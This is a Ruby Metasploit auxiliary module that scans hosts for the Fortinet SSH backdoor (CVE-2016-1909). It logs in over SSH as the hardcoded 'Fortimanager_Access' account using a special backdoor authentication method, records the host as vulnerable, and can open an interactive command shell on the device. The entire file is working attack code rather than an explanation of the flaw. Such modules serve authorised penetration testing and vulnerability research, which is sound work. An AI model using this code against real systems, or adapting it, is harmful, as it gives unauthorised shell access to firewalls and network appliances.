##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::ReportSummary

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fortinet SSH Backdoor Scanner',
      'Description'    => %q{
        This module scans for the Fortinet SSH backdoor.
      },
      'Author'         => [
        'operator8203 <operator8203[at]runbox.com>', # PoC
        'wvu'                                        # Module
      ],
      'References'     => [
        ['CVE', '2016-1909'],
        ['EDB', '39224'],
        ['PACKETSTORM', '135225'],
        ['URL', 'https://seclists.org/fulldisclosure/2016/Jan/26'],
        ['URL', 'https://blog.fortinet.com/post/brief-statement-regarding-issues-found-with-fortios']
      ],
      'DisclosureDate' => '2016-01-09',
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(22)
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  def run_host(ip)
    factory = ssh_socket_factory

    ssh_opts = ssh_client_defaults.merge({
      port:            rport,
      # The auth method is converted into a class name for instantiation,
      # so fortinet-backdoor here becomes FortinetBackdoor from the mixin
      auth_methods:    ['fortinet-backdoor']
    })

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, 'Fortimanager_Access', ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    return unless ssh

    print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")

    version = ssh.transport.server_version.version

    report_vuln(
      host: ip,
      name: self.name,
      refs: self.references,
      info: version
    )

    shell = Net::SSH::CommandStream.new(ssh, logger: self)

    # XXX: Wait for CommandStream to log a channel request failure
    sleep 0.1

    if (e = shell.error)
      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    info = "#{self.name} (#{version})"

    ds_merge = {
      'USERNAME' => 'Fortimanager_Access'
    }

    if datastore['CreateSession']
      start_session(self, info, ds_merge, false, shell.lsock)
    end

    # XXX: Ruby segfaults if we don't remove the SSH socket
    remove_socket(ssh.transport.socket)
  end

  def rport
    datastore['RPORT']
  end

end
